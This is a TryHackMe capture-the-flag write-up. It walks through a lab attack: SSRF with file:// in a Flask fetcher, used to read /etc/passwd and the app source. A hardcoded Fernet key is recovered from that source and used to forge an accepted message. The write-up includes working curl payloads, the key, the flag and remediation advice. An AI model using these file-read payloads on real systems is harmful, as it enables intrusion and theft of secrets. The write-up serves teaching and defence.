# TryHackMe: Message to Garcia

**Room:** [Message to Garcia](https://tryhackme.com/room/messagetogarcia) (Free) · **Topic:** SSRF → source disclosure → symmetric crypto · **Difficulty:** Intermediate
**Author:** Marcin Korczak ([@KordjanCode](https://github.com/KordjanCode))

> A free room, so I'm showing the full solution. The framing is Elbert Hubbard's 1899 essay *A Message to Garcia*: Lt. Rowan gets one job, deliver a message, and just gets it done with the little he's given. Here I had to deliver an encrypted message to a server without knowing the key or the message, and find my own way in.

## The scenario

The target runs a "secure file transfer" platform. I need to upload a correctly encrypted message that the server will accept, but I don't have the key, the plaintext, or valid credentials. Everything has to come from finding my way into the box.

---

## Step 1: Seeing what's open

I started with a full port scan:

```bash
nmap -sV -p- --min-rate 1000 10.80.164.254
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11
80/tcp   open  http    nginx 1.24.0 (Ubuntu)
5000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.3)
```

Three services: SSH, nginx on 80, and a Flask/Werkzeug app on 5000. I tried SSH first, but it only accepts public keys:

```bash
ssh m@10.80.164.254
# m@10.80.164.254: Permission denied (publickey)
```

No password auth, and I don't have a key. So the way in has to be the web app.

## Step 2: Exploring the application

The app on 5000 is a "Message to Garcia" upload page. Reading the HTML, I found three extra endpoints linked in the header:

- `/upload` — takes an encrypted `.enc` / `.gpg` file and validates it
- `/backup` — upload with a custom filename
- `/fetch` — a "Resource Fetcher"

`/fetch` was the interesting one. Its form literally advertises a `file://` protocol:

```
placeholder="https://example.com or file://README.md"
Supports HTTP/HTTPS URLs and local file protocol.
```

A fetcher that accepts user URLs with no validation is a classic SSRF, and `file://` turns it straight into local file read.

## Step 3: Confirming the local file read

The endpoint redirects and shows the result as a flash message, so I kept a cookie jar and followed the redirect:

```bash
curl -s -c /tmp/c -b /tmp/c -X POST http://10.80.164.254:5000/fetch \
  --data-urlencode "url=file:///etc/passwd" >/dev/null
curl -s -b /tmp/c http://10.80.164.254:5000/fetch | grep -E "root:|ubuntu:"
```

```
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
```

LFI confirmed. There's a real `ubuntu` user, but no SSH private key in the usual places. So instead of chasing keys, I went after the application's own source.

## Step 4: Finding where the app lives

The flash message accumulates old responses, so I cleared the cookie before each read to keep output clean. First I asked the process what it was running:

```bash
rm -f /tmp/c
curl -s -c /tmp/c -b /tmp/c -X POST http://10.80.164.254:5000/fetch \
  --data-urlencode "url=file:///proc/self/cmdline" >/dev/null
curl -s -b /tmp/c http://10.80.164.254:5000/fetch | grep -a "<pre" | tr '\0' ' '
```

```
File content: python3 app.py
```

So it's `python3 app.py`, launched from its own working directory. `/proc/self/cwd` points there, which means I can read the app files by relative path without knowing the absolute one:

```bash
rm -f /tmp/c
curl -s -c /tmp/c -b /tmp/c -X POST http://10.80.164.254:5000/fetch \
  --data-urlencode "url=file:///proc/self/cwd/app.py" >/dev/null
curl -s -b /tmp/c http://10.80.164.254:5000/fetch | sed -n '/<pre/,/<\/pre>/p'
```

`app.py` came back in full. It imports two helpers, `from functions import ...` and `from sftp_server import ...`, and the `/upload` route calls `validate_encrypted_message()`. The crypto lives in those helper files.

## Step 5: Stealing the key from the source

I read `functions.py` the same way (`file:///proc/self/cwd/functions.py`), and it had everything hardcoded:

```python
from cryptography.fernet import Fernet

ENCRYPTION_KEY = b'TUVTU0FHRVRPR0FSQ0lBMjAyNF9LRVkhISEhISEhISE='
cipher = Fernet(ENCRYPTION_KEY)

EXPECTED_MESSAGE = "Garcia, it seems I've cracked the code!! I need you to meet me at coordinates: 40.4168° N, 3.7038° W. The cipher is: TRACK"

def validate_encrypted_message(encrypted_data: bytes):
    decrypted = cipher.decrypt(encrypted_data)
    plaintext = decrypted.decode('utf-8').strip()
    if plaintext == EXPECTED_MESSAGE:
        return True, "Message is valid."
    ...
```

This answers the crypto questions directly:

- **Type of encryption:** symmetric (one key for encrypt and decrypt).
- **Authenticated encryption implementation:** **Fernet** — AES-128-CBC for confidentiality plus HMAC-SHA256 for authentication.
- **Encryption key:** `TUVTU0FHRVRPR0FSQ0lBMjAyNF9LRVkhISEhISEhISE=`
- **Message to deliver:** `Garcia, it seems I've cracked the code!! I need you to meet me at coordinates: 40.4168° N, 3.7038° W. The cipher is: TRACK`

Fernet's whole security rests on the key staying secret. The moment the SSRF let me read `functions.py`, the cipher was worthless, I could produce a valid ciphertext myself.

## Step 6: Forging the message and delivering it

I replicated the backend's encryption locally: same key, exact same plaintext.

```python
from cryptography.fernet import Fernet
key = b"TUVTU0FHRVRPR0FSQ0lBMjAyNF9LRVkhISEhISEhISE="
msg = "Garcia, it seems I've cracked the code!! I need you to meet me at coordinates: 40.4168° N, 3.7038° W. The cipher is: TRACK"
open("message.enc", "wb").write(Fernet(key).encrypt(msg.encode()))
```

Then I uploaded it to `/upload`:

```bash
rm -f /tmp/c
curl -s -c /tmp/c -b /tmp/c -L -F "file=@message.enc" \
  http://10.80.164.254:5000/upload | grep -iE "flag|THM"
```

```
THM{ssrf_2_rce_v1a_message_2_garc1a}
```

The server decrypted my file, matched it against `EXPECTED_MESSAGE`, set the `challenge_solved` session token and showed the success page.

**Flag:** `THM{ssrf_2_rce_v1a_message_2_garc1a}`

---

## What I'd tell the team

**What went wrong:**
- `/fetch` passed user input straight into `urllib`/`open()` with no scheme or path validation, so `file://` gave arbitrary local file read.
- Reading `/proc/self/cmdline` and `/proc/self/cwd/` let me locate and dump the full application source without knowing any absolute paths.
- The Fernet key and the expected plaintext were hardcoded in `functions.py`, so source disclosure instantly broke the crypto.

**What I'd change:**
- Validate the fetcher: allow-list schemes (only `http`/`https`), block `file://`, `gopher://`, internal IPs and localhost, and never expose raw file contents.
- Keep secrets out of source. Load the key from a secrets manager or environment, not a committed file, and rotate it since it's now burned.
- Don't rely on a shared symmetric key as an authorization gate. Anyone who can read the key can forge a valid message.
- Restrict what the app process can read (dedicated user, minimal file permissions), so even an LFI can't reach application source or `/proc`.

## IOCs

This is a CTF, so there's no real adversary infrastructure, but the artefacts a defender would flag:

| Type | Value |
|---|---|
| Endpoint abused | `POST /fetch` with `url=file://...` |
| LFI targets | `/etc/passwd`, `/proc/self/cmdline`, `/proc/self/cwd/app.py`, `functions.py` |
| Leaked secret | Fernet key `TUVTU0FHRVRPR0FSQ0lBMjAyNF9LRVkhISEhISEhISE=` |
| Indicator | Repeated `/fetch` POSTs reading `file://` paths from one source IP |

## Mapping

| Framework | ID | What it covers here |
|---|---|---|
| MITRE ATT&CK | T1190 | Exploit public-facing application (SSRF / LFI) |
| MITRE ATT&CK | T1083 | File and directory discovery (`/proc`, source files) |
| MITRE ATT&CK | T1552.001 | Credentials in files (hardcoded Fernet key) |
| OWASP Top 10 | A10:2021 | Server-Side Request Forgery (SSRF) |
| OWASP Top 10 | A01:2021 | Broken Access Control (path traversal / LFI) |
| CWE | CWE-918 | Server-Side Request Forgery |
| CWE | CWE-22 | Improper limitation of a pathname (path traversal) |
| CWE | CWE-798 | Use of hardcoded credentials |

## Takeaways

The lesson here is old but it keeps paying off: **a secret in source code is not a secret.** Fernet is solid authenticated encryption, but the whole scheme collapsed the moment one SSRF let me read the file holding the key. The `/proc/self/cwd` trick is also worth remembering, when you have file read but not the app's path, the process tells you where it lives. And the essay's point holds for recon too: I didn't have the key or the message, I just kept pulling threads until the box handed them over.

---

*Write-up by Marcin Korczak, based on a TryHackMe lab, for educational purposes.*
